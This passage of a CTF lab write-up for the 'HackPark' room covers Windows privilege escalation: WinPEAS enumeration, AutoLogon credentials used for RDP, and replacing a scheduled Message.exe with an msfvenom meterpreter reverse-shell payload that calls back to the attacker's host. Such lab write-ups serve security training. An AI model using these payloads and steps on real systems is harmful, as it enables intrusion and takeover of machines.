Now that we have a stable shell, we wish to escalate privileges. Using `sysinfo` gives us some more information about the Windows machine.

<center>

![ef80725497f42f86fff2a3f0ac010f3d.png](HackPark/_resources/ef80725497f42f86fff2a3f0ac010f3d-1.png)

</center>

The room suggests feeding the output into [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) in order to determine further exploits for privilege escalation. However, this didn't seem to work for me. Instead, we'll use WinPEAS. We download the x64 exe file [from here](https://github.com/carlospolop/PEASS-ng/releases/tag/20220717) and we transfer it to the target system. Here, I switched to a Windows shell within meterpreter with `shell powershell` and used the same command we used before.

<center>

![a556bb3bcc0fd6bcf88720ab09fa4b6e.png](HackPark/_resources/a556bb3bcc0fd6bcf88720ab09fa4b6e-1.png)

</center>

We then run winPEASx64.exe. We find some AutoLogon credentials.

<center>

![b295c359179f0979ebbdecbdd843c173.png](HackPark/_resources/b295c359179f0979ebbdecbdd843c173-1.png)

</center>

We saw that port 3389 was open and serving a Microsoft Web Server. We can use this to connect to the machine as administrator. Open a new terminal and use the command `xfreerdp /tls-seclevel:0 /u:Administrator /p:<password> /v:10.10.0.19`.

(Note: I had issues connecting to the Windows machine via RDP; a bit of Googling suggested modifying the tls-seclevel parameter. The above parameter worked for me, although I'm not sure why.)

After RDPing into the machine, we have root access. The root flag is found on the desktop.

<center>

![e0b4da138dfc97dec15f63bb7e4141cc.png](HackPark/_resources/e0b4da138dfc97dec15f63bb7e4141cc-1.png)

</center>

Similarly, we can navigate to Jeff's desktop to obtain his flag.

<center>

![b7a8c407998e463c4527ee3e432c1a3c.png](HackPark/_resources/b7a8c407998e463c4527ee3e432c1a3c-1.png)

</center>

Alternatively, we can follow the intended path given in Task 4 of the room. Sifting through the winPEAS output, we eventually find an abnormal service running on the Windows machine.

<center>

![6b5ec3c6fd6524ee0e3fcd0fa2f10dae.png](HackPark/_resources/6b5ec3c6fd6524ee0e3fcd0fa2f10dae-1.png)

</center>

It seems that something is happening with the Windows Scheduler service. We caught a glimpse of this when we RDP'd into the machine; every minute or so, a strange message pops up. Within our netcat session, we navigate to `C:\Program Files (x86)\SystemScheduler` and run `tasklist /v` to see a list of currently running tasks. We note that the file `Message.exe` seems to be sheduled.

<center>

![47cc8dde9b28889cfdc4f0f59e13b6a7.png](HackPark/_resources/47cc8dde9b28889cfdc4f0f59e13b6a7-1.png)

</center>

Our goal is to replace this file with our msfvenom payload in order to spawn a reverse shell. We use the same command as before to generate the payload, making sure to use a different port this time.

```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.6.30.43 LPORT=9998 -f exe -o Message.exe 
```

Now repeat the steps from the previous task by setting up a Metasploit handler: Delete the old Message.exe file with `del /f Message.exe`, upload the new Message.exe payload to the target system, and wait for the task to execute. Since the system scheduler runs with admin privileges, this gives us a reverse shell with elevated privileges which we can use to access the two needed flags. Now we can navigate to the relevant folders within the meterpreter shell to find the flags.

<center>

![cf3e3caf2dcae4113c340614d619b940.png](HackPark/_resources/cf3e3caf2dcae4113c340614d619b940-1.png)

![5388252d3f95cf1883f78afa49146da9.png](HackPark/_resources/5388252d3f95cf1883f78afa49146da9-1.png)

</center>

To finish the room, we just need to find the original install time. This type of information can be found in the winPEAS output. The correct date and time turns out to be the same as the last time the Administrator's password was reset.

<center>

![06e783f7ae4b055418e0574d50c22ff6.png](HackPark/_resources/06e783f7ae4b055418e0574d50c22ff6-1.png)

</center>